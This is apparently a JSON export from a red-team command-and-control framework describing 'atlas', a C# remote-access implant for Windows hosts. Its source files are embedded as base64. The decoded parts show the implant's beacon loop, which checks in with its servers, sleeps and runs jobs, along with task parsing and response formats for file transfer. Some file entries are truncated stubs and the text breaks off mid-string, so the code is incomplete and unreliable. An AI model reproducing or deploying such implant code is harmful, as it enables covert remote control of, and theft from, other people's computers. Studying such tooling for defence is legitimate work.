{"payload_types":[{"wrapper":false,"command_template":"\n","supported_os":"Windows (x86),Windows (x64)","execute_help":"Run as a normal executable on Windows or use the donut project to turn into shellcode: https:\/\/github.com\/TheWover\/donut","external":false,"container_running":true,"service":"rabbitmq","author":"@Airzero24","note":"This payload uses C# to target Windows hosts with the .NET framework installed.","supports_dynamic_loading":false,"deleted":false,"last_heartbeat":"03\/05\/2020 07:00:40","ptype":"atlas","file_extension":"cs","wrapped_payload_type":"null","icon":null,"files":[{"Atlas.csproj":"77u\/PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjxQcm9qZWN0IFRvb2xzVmVyc2lvbj0iMTUuMCIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vZGV2ZWxvcGVyL21zYnVpbGQvMjAwMyI+DQogIDxJbXBvcnQgUHJvamVjdD0iJChNU0J1aWxkRXh0ZW5zaW9uc1BhdGgpXCQoTVNCdWlsZFRvb2xzVmVyc2lvbilcTWljcm9zb2Z0LkNvbW1vbi5wcm9wcyIgQ29uZGl0aW9uPSJFeGlzdHMoJyQoTVNCdWlsZEV4dGVuc2lvbnNQYXRoKVwkKE1TQnVpbGRUb29sc1ZlcnNpb24pXE1pY3Jvc29mdC5Db21tb24ucHJvcHMnKSIgLz4NCiAgPFByb3BlcnR5R3JvdXA+DQogICAgPENvbmZpZ3VyYXRpb24gQ29uZGl0aW9uPSIgJyQoQ29uZmlndXJhdGlvbiknID09ICcnICI+UmVsZWFzZTwvQ29uZmlndXJhdGlvbj4NCiAgICA8UGxhdGZvcm0gQ29uZGl0aW9uPSIgJyQoUGxhdGZvcm0pJyA9PSAnJyAiPkFueUNQVTwvUGxhdGZvcm0+DQogICAgPFByb2plY3RHdWlkPnswNUE1RDRFQi1EQzE5LTQ4MDAtODlFRC1CMTMxQjMzNTE3RER9PC9Qcm9qZWN0R3VpZD4NCiAgICA8T3V0cHV0VHlwZT5XaW5FeGU8L091dHB1dFR5cGU+DQogICAgPFJvb3ROYW1lc3BhY2U+QXRsYXM8L1Jvb3ROYW1lc3BhY2U+DQogICAgPEFzc2VtYmx5TmFtZT5BdGxhczwvQXNzZW1ibHlOYW1lPg0KICAgIDxUYXJnZXRGcmFtZXdvcmtWZXJzaW9uPnYzLjU8L1RhcmdldEZyYW1ld29ya1ZlcnNpb24+DQogICAgPEZpbGVBbGlnbm1lbnQ+NTEyPC9GaWxlQWxpZ25tZW50Pg0KICAgIDxEZXRlcm1pbmlzdGljPnRydWU8L0RldGVybWluaXN0aWM+DQogICAgPE51R2V0UGFja2FnZUltcG9ydFN0YW1wPg0KICAgIDwvTnVHZXRQYWNrYWdlSW1wb3J0U3RhbXA+DQogICAgPFB1Ymxpc2hVcmw+cHVibGlzaFw8L1B1Ymxpc2hVcmw+DQogICAgPEluc3RhbGw+dHJ1ZTwvSW5zdGFsbD4NCiAgICA8SW5zdGFsbEZyb20+RGlzazwvSW5zdGFsbEZyb20+DQogICAgPFVwZGF0ZUVuYWJsZWQ+ZmFsc2U8L1VwZGF0ZUVuYWJsZWQ+DQogICAgPFVwZGF0ZU1vZGU+Rm9yZWdyb3VuZDwvVXBkYXRlTW9kZT4NCiAgICA8VXBkYXRlSW50ZXJ2YWw+NzwvVXBkYXRlSW50ZXJ2YWw+DQogICAgPFVwZGF0ZUludGVydmFsVW5pdHM+RGF5czwvVXBkYXRlSW50ZXJ2YWxVbml0cz4NCiAgICA8VXBkYXRlUGVyaW9kaWNhbGx5PmZhbHNlPC9VcGRhdGVQZXJpb2RpY2FsbHk+DQogICAgPFVwZGF0ZVJlcXVpcmVkPmZhbHNlPC9VcGRhdGVSZXF1aXJlZD4NCiAgICA8TWFwRmlsZUV4dGVuc2lvbnM+dHJ1ZTwvTWFwRmlsZUV4dGVuc2lvbnM+DQogICAgPEFwcGxpY2F0aW9uUmV2aXNpb24+MDwvQXBwbGljYXRpb25SZXZpc2lvbj4NCiAgICA8QXBwbGljYXRpb25WZXJzaW9uPjEuMC4wLiUyYTwvQXBwbGljYXRpb25WZXJzaW9uPg0KICAgIDxJc1dlYkJvb3RzdHJhcHBlcj5mYWxzZTwvSXNXZWJCb290c3RyYXBwZXI+DQogICAgPFVzZUFwcGxpY2F0aW9uVHJ1c3Q+ZmFsc2U8L1VzZUFwcGxpY2F0aW9uVHJ1c3Q+DQogICAgPEJvb3RzdHJhcHBlckVuYWJsZWQ+dHJ1ZTwvQm9vdHN0cmFwcGVyRW5hYmxlZD4NCiAgICA8VGFyZ2V0RnJhbWV3b3JrUHJvZmlsZSAvPg0KICA8L1Byb3BlcnR5R3JvdXA+DQogIDxQcm9wZXJ0eUdyb3VwIENvbmRpdGlvbj0iICckKENvbmZpZ3VyYXRpb24pfCQoUGxhdGZvcm0pJyA9PSAnRGVidWd8QW55Q1BVJyAiPg0KICAgIDxQbGF0Zm9ybVRhcmdldD5BbnlDUFU8L1BsYXRmb3JtVGFyZ2V0Pg0KICAgIDxEZWJ1Z1N5bWJvbHM+dHJ1ZTwvRGVidWdTeW1ib2xzPg0KICAgIDxEZWJ1Z1R5cGU+ZnVsbDwvRGVidWdUeXBlPg0KICAgIDxPcHRpbWl6ZT5mYWxzZTwvT3B0aW1pemU+DQogICAgPE91dHB1dFBhdGg+YmluXERlYnVnXDwvT3V0cHV0UGF0aD4NCiAgICA8RGVmaW5lQ29uc3RhbnRzPkRFQlVHO1RSQUNFPC9EZWZpbmVDb25zdGFudHM+DQogICAgPEVycm9yUmVwb3J0PnByb21wdDwvRXJyb3JSZXBvcnQ+DQogICAgPFdhcm5pbmdMZXZlbD40PC9XYXJuaW5nTGV2ZWw+DQogIDwvUHJvcGVydHlHcm91cD4NCiAgPFByb3BlcnR5R3JvdXAgQ29uZGl0aW9uPSIgJyQoQ29uZmlndXJhdGlvbil8JChQbGF0Zm9ybSknID09ICdSZWxlYXNlfEFueUNQVScgIj4NCiAgICA8UGxhdGZvcm1UYXJnZXQ+QW55Q1BVPC9QbGF0Zm9ybVRhcmdldD4NCiAgICA8RGVidWdUeXBlPm5vbmU8L0RlYnVnVHlwZT4NCiAgICA8T3B0aW1pemU+dHJ1ZTwvT3B0aW1pemU+DQogICAgPE91dHB1dFBhdGg+YmluXFJlbGVhc2VcPC9PdXRwdXRQYXRoPg0KICAgIDxEZWZpbmVDb25zdGFudHM+VFJBQ0U8L0RlZmluZUNvbnN0YW50cz4NCiAgICA8RXJyb3JSZXBvcnQ+cHJvbXB0PC9FcnJvclJlcG9ydD4NCiAgICA8V2FybmluZ0xldmVsPjQ8L1dhcm5pbmdMZXZlbD4NCiAgPC9Qcm9wZXJ0eUdyb3VwPg0KICA8UHJvcGVydHlHcm91cD4NCiAgICA8U3RhcnR1cE9iamVjdCAvPg0KICA8L1Byb3BlcnR5R3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPFJlZmVyZW5jZSBJbmNsdWRlPSJTeXN0ZW0iIC8+DQogICAgPFJlZmVyZW5jZSBJbmNsdWRlPSJTeXN0ZW0uQ29yZSIgLz4NCiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbS5YbWwuTGlucSIgLz4NCiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbS5EYXRhLkRhdGFTZXRFeHRlbnNpb25zIiAvPg0KICAgIDxSZWZlcmVuY2UgSW5jbHVkZT0iTWljcm9zb2Z0LkNTaGFycCIgLz4NCiAgICA8UmVmZXJlbmNlIEluY2x1ZGU9IlN5c3RlbS5EYXRhIiAvPg0KICAgIDxSZWZlcmVuY2UgSW5jbHVkZT0iU3lzdGVtLlhtbCIgLz4NCiAgPC9JdGVtR3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPENvbXBpbGUgSW5jbHVkZT0iQ29uZmlnLmNzIiAvPg0KICAgIDxDb21waWxlIEluY2x1ZGU9IkNyeXB0by5jcyIgLz4NCiAgICA8Q29tcGlsZSBJbmNsdWRlPSJIdHRwLmNzIiAvPg0KICAgIDxDb21waWxlIEluY2x1ZGU9Ik1vZHVsZXMuY3MiIC8+DQogICAgPENvbXBpbGUgSW5jbHVkZT0iUHJvZ3JhbS5jcyIgLz4NCiAgICA8Q29tcGlsZSBJbmNsdWRlPSJVdGlscy5jcyIgLz4NCiAgPC9JdGVtR3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPE5vbmUgSW5jbHVkZT0iYXBwLmNvbmZpZyIgLz4NCiAgPC9JdGVtR3JvdXA+DQogIDxJdGVtR3JvdXA+DQogICAgPEJvb3RzdHJhcHBlclBhY2thZ2UgSW5jbHVkZT0iTWljcm9zb2Z0Lk5ldC5GcmFtZXdvcmsuMy41LlNQMSI+DQogICAgICA8VmlzaWJsZT5GYWxzZTwvVmlzaWJsZT4NCiAgICAgIDxQcm9kdWN0TmFtZT4uTkVUIEZyYW1ld29yayAzLjUgU1AxPC9Qcm9kdWN0TmFtZT4NCiAgICAgIDxJbnN0YWxsPmZhbHNlPC9JbnN0YWxsPg0KICAgIDwvQm9vdHN0cmFwcGVyUGFja2FnZT4NCiAgPC9JdGVtR3JvdXA+DQogIDxJbXBvcnQgUHJvamVjdD0iJChNU0J1aWxkVG9vbHNQYXRoKVxNaWNyb3NvZnQuQ1NoYXJwLnRhcmdldHMiIC8+DQo8L1Byb2plY3Q+"},{"Crypto.cs":"77u\"},{"Program.cs":"77u\/bmFtZXNwYWNlIEF0bGFzDQp7DQogICAgY2xhc3MgUHJvZ3JhbQ0KICAgIHsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykNCiAgICAgICAgew0KICAgICAgICAgICAgVXRpbHMuR2V0U2VydmVycygpOw0KICAgICAgICAgICAgd2hpbGUgKCFIdHRwLkNoZWNrSW4oKSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpbnQgRHdlbGwgPSBVdGlscy5HZXREd2VsbFRpbWUoKTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZC5TbGVlcChEd2VsbCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBVdGlscy5Kb2JMaXN0IEpvYkxpc3QgPSBuZXcgVXRpbHMuSm9iTGlzdA0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYl9jb3VudCA9IDAsDQogICAgICAgICAgICAgICAgam9icyA9IHsgfQ0KICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIHdoaWxlICh0cnVlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIFV0aWxzLkxvb3AoSm9iTGlzdCk7DQogICAgICAgICAgICAgICAgaW50IER3ZWxsID0gVXRpbHMuR2V0RHdlbGxUaW1lKCk7DQogICAgICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5UaHJlYWQuU2xlZXAoRHdlbGwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K"},{"Modules.cs":"77u\"},{"Http_3.5.cs":"77u\"},{"Uuid.txt":"VVVJRF9IRVJF"},{"Utils.cs":"77u\\\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7M30iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezN9IiwgIig\/J2dyb3VwMycuKikiKTsgfQ0KICAgICAgICAgICAgICAgIE1hdGNoIG1hdGNoID0gbmV3IFJlZ2V4KGZvcm1hdCkuTWF0Y2goZGF0YSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDIiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAyIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMyJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8VGFzaz4gUGFyc2VUYXNrcyhzdHJpbmcgdGFza3NfanNvbikNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAodGFza3NfanNvbiA9PSAiW10iKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tzX2pzb24gPSB0YXNrc19qc29uLlJlcGxhY2UoIlsiLCBAIiIpLlJlcGxhY2UoIl0iLCBAIiIpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBMaXN0PFRhc2s+IHRhc2tzID0gbmV3IExpc3Q8VGFzaz4oKTsNCiAgICAgICAgICAgICAgICBzdHJpbmdbXSB0YXNrc19zcGxpdCA9IHRhc2tzX2pzb24uU3BsaXQobmV3W10geyAifSwiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5SZW1vdmVFbXB0eUVudHJpZXMpOw0KICAgICAgICAgICAgICAgIGludCBjb3VudCA9IDA7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoc3RyaW5nIHRhc2sgaW4gdGFza3Nfc3BsaXQpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gbmV3IExpc3Q8c3RyaW5nPiB7IH07DQogICAgICAgICAgICAgICAgICAgIGlmIChjb3VudCArIDEgIT0gdGFza3Nfc3BsaXQuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2sgKyAifSIsIFRhc2tGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0WzBdID09ICIiKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBmb3JtYXQgPSBAInt7IiJjb21tYW5kIiI6ICIiezB9IiIsICIicGFyYW1ldGVycyIiOiAiInsxfSIiLCAiImlkIiI6ICIiezJ9IiIsICIidGltZXN0YW1wIiI6IHszfX19IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBUYXNrLlBhcnNlKHRhc2ssIGZvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzayArICJ9IiwgVGFza0Zvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3RbMF0gPT0gIiIpDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGZvcm1hdCA9IEAie3siImNvbW1hbmQiIjogIiJ7MH0iIiwgIiJwYXJhbWV0ZXJzIiI6ICIiezF9IiIsICIiaWQiIjogIiJ7Mn0iIiwgIiJ0aW1lc3RhbXAiIjogezN9fX0iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFRhc2suUGFyc2UodGFzaywgZm9ybWF0LlJlcGxhY2UoInt7IiwgInsiKS5SZXBsYWNlKCJ9fSIsICJ9IikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gNCkgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgICAgICBUYXNrIG5ld190YXNrID0gbmV3IFRhc2sNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcmFtZXRlcnMgPSBwYXJzZUxpc3RbMV0sDQogICAgICAgICAgICAgICAgICAgICAgICBpZCA9IHBhcnNlTGlzdFsyXSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcCA9IHBhcnNlTGlzdFszXQ0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICB0YXNrcy5BZGQobmV3X3Rhc2spOw0KICAgICAgICAgICAgICAgICAgICArK2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gdGFza3M7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVGFza1Jlc3BvbnNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHVzZXJfb3V0cHV0IHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgc3RhdHVzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgY29tcGxldGVkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZXJyb3IgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludD8gdG90YWxfY2h1bmtzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZnVsbF9wYXRoIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQ\/IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNodW5rX2RhdGEgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0ID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6ezN9LCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6ezV9LCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOns3fSwiImNodW5rX2RhdGEiIjoiIns4fSIiLCIiZmlsZV9pZCIiOiIiezl9IiJ9fSI7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIEpzb25Gb3JtYXQxID0gQCJ7eyIidGFza19pZCIiOiIiezB9IiIsIiJ1c2VyX291dHB1dCIiOiIiezF9IiIsIiJzdGF0dXMiIjoiInsyfSIiLCIiY29tcGxldGVkIiI6IiJ7M30iIiwiImVycm9yIiI6IiJ7NH0iIiwiInRvdGFsX2NodW5rcyIiOiIiezV9IiIsIiJmdWxsX3BhdGgiIjoiIns2fSIiLCIiY2h1bmtfbnVtIiI6ezd9LCIiY2h1bmtfZGF0YSIiOiIiezh9IiIsIiJmaWxlX2lkIiI6IiJ7OX0iIn19IjsNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdDIgPSBAInt7IiJ0YXNrX2lkIiI6IiJ7MH0iIiwiInVzZXJfb3V0cHV0IiI6IiJ7MX0iIiwiInN0YXR1cyIiOiIiezJ9IiIsIiJjb21wbGV0ZWQiIjoiInszfSIiLCIiZXJyb3IiIjoiIns0fSIiLCIidG90YWxfY2h1bmtzIiI6ezV9LCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOiIiezd9IiIsIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBKc29uRm9ybWF0MyA9IEAie3siInRhc2tfaWQiIjoiInswfSIiLCIidXNlcl9vdXRwdXQiIjoiInsxfSIiLCIic3RhdHVzIiI6IiJ7Mn0iIiwiImNvbXBsZXRlZCIiOiIiezN9IiIsIiJlcnJvciIiOiIiezR9IiIsIiJ0b3RhbF9jaHVua3MiIjoiIns1fSIiLCIiZnVsbF9wYXRoIiI6IiJ7Nn0iIiwiImNodW5rX251bSIiOiIiezd9IiIsIiJjaHVua19kYXRhIiI6IiJ7OH0iIiwiImZpbGVfaWQiIjoiIns5fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oVGFza1Jlc3BvbnNlIHRhc2tfcmVzcG9uc2UpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS51c2VyX291dHB1dCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS51c2VyX291dHB1dCA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jb21wbGV0ZWQgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuY29tcGxldGVkID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLmVycm9yID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmVycm9yID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh0YXNrX3Jlc3BvbnNlLnN0YXR1cyA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5zdGF0dXMgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIHRvdGFsX2NodW5rczsNCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS50b3RhbF9jaHVua3MgPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDE7DQogICAgICAgICAgICAgICAgICAgIHRvdGFsX2NodW5rcyA9ICIiOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQgPSB0YXNrX3Jlc3BvbnNlLkpzb25Gb3JtYXQyOw0KICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSB0YXNrX3Jlc3BvbnNlLnRvdGFsX2NodW5rcy5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5mdWxsX3BhdGggPT0gbnVsbCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHRhc2tfcmVzcG9uc2UuZnVsbF9wYXRoID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHN0cmluZyBjaHVua19udW07DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuY2h1bmtfbnVtID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBpZiAoRm9ybWF0ICE9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDIpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEZvcm1hdCA9IHRhc2tfcmVzcG9uc2UuSnNvbkZvcm1hdDM7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgY2h1bmtfbnVtID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmIChGb3JtYXQgIT0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MikNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgRm9ybWF0ID0gdGFza19yZXNwb25zZS5Kc29uRm9ybWF0MTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSB0YXNrX3Jlc3BvbnNlLmNodW5rX251bS5Ub1N0cmluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAodGFza19yZXNwb25zZS5jaHVua19kYXRhID09IG51bGwpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB0YXNrX3Jlc3BvbnNlLmNodW5rX2RhdGEgPSAiIjsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKHRhc2tfcmVzcG9uc2UuZmlsZV9pZCA9PSBudWxsKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdGFza19yZXNwb25zZS5maWxlX2lkID0gIiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBTdHJpbmcuRm9ybWF0KA0KICAgICAgICAgICAgICAgICAgICBGb3JtYXQsDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS50YXNrX2lkKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnVzZXJfb3V0cHV0KSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLnN0YXR1cyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5jb21wbGV0ZWQpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRhc2tfcmVzcG9uc2UuZXJyb3IpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHRvdGFsX2NodW5rcyksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5mdWxsX3BhdGgpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKGNodW5rX251bSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUodGFza19yZXNwb25zZS5jaHVua19kYXRhKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh0YXNrX3Jlc3BvbnNlLmZpbGVfaWQpDQogICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHRhc2tfaWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBzdGF0dXMgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBlcnJvciB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIG